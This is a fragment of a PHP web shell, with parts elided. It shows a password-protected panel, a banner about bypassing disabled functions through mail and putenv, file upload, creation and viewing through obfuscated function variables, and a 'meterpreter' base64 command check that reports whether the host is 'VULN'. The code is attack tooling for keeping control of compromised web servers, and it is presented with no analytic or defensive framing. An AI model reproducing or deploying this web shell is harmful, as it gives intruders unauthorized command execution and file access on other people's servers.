<?php
ob_start();
$hashed_password = '$2a$10$8D2JgdsK/ZQEHbw.i9USdezrQAhQfQbW586YLf5J3vubOI788Cvlq';
...
echo "<font color='black'>[ Command Bypas Status Wajib ON MAIL PUTENV @ ]</font><br>";
if (function_exists('mail')) {
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        ...
        if (!file_exists($newFile)) {
            if ($fpc($newFile, '') !== false) {
                ...
                $fileToView = $newFile;
                if (file_exists($fileToView)){$fileContent = $fgc($fileToView);
        ...
        $viewCommandResult = '<hr><p>Result: <font color="black">base64 : ' . $meterpreter .'</br>Please Refresh and Check File test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>Powered By urity</font><br><br></textarea>';        
    ...
    } elseif (isset($_POST['view_file'])){$fileToView = $currentDirectory . '/' . $_POST['view_file'];
